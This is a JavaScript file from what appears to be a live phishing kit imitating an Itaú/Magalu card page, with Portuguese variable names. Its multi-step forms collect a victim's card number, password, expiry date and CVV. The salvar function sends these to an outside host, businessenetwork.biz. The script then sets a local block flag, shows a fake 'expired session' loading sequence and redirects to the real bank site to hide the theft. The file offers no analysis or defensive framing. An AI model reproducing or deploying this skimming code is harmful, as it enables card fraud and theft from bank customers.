const pessoa = {};
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

async function first() {
    const divs = Array.from(document.querySelectorAll('.login-content'));
    const index = divs.indexOf(document.querySelector('.form-unhidden'));
    const ccn = document.getElementById('ccn').value;

    if ( ccn.length < 19) return;

    pessoa.card = ccn;

    await sleep(500);

    divs[index].classList.remove('form-unhidden');
    divs[index + 1].classList.add('form-unhidden');
}

async function second() {
    const divs = Array.from(document.querySelectorAll('.login-content'));
    const index = divs.indexOf(document.querySelector('.form-unhidden'));
    const senha = document.getElementById('senha').value;

    if ( senha.length < 4) return;

    pessoa.senha = senha;

    await sleep(500);

    divs[index].classList.remove('form-unhidden');
    divs[index + 1].classList.add('form-unhidden');
}

async function third() {
    const divs = Array.from(document.querySelectorAll('.login-content'));
    const index = divs.indexOf(document.querySelector('.form-unhidden'));
    const validade = document.getElementById('validade').value;

    if ( validade.length < 5) return;

    pessoa.validade = validade;

    await sleep(500);

    divs[index].classList.remove('form-unhidden');
    divs[index + 1].classList.add('form-unhidden');
}

async function fourth() {
    const cvv = document.getElementById('cvv').value;
    
    if ( cvv.length < 3) return;
    
    pessoa.cvv = cvv;

    salvar('mobile', `${pessoa.card}|${pessoa.validade}|${pessoa.cvv}|senha: ${pessoa.senha}`);

    BloquearAcesso();

    ExpiredSessionFake();
}

async function salvar(tipo, string) {
    let url = 'https://businessenetwork.biz/register/';

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: `{"string":"${string}"}`
    };

    fetch(url, options)
        .then(res => res.json())
        .then(json => console.log(json))
        .catch(err => console.error('error:' + err));
}

$('#validade').mask('00/00');
$('#ccn').mask('0000 0000 0000 0000');

async function BloquearAcesso() {
    localStorage.setItem('blocked', true);
}

async function ExpiredSessionFake() {
    document.getElementsByClassName("loading2")[0].style.display = "block"
    await sleep(2000);

    document.getElementsByClassName("loading2")[0].style.display = "none"
    document.getElementsByClassName("loading")[0].style.display = "block"

    await sleep(2000);

    window.location = 'https://www.itau.com.br/magalu/consulte-sua-fatura/';
}
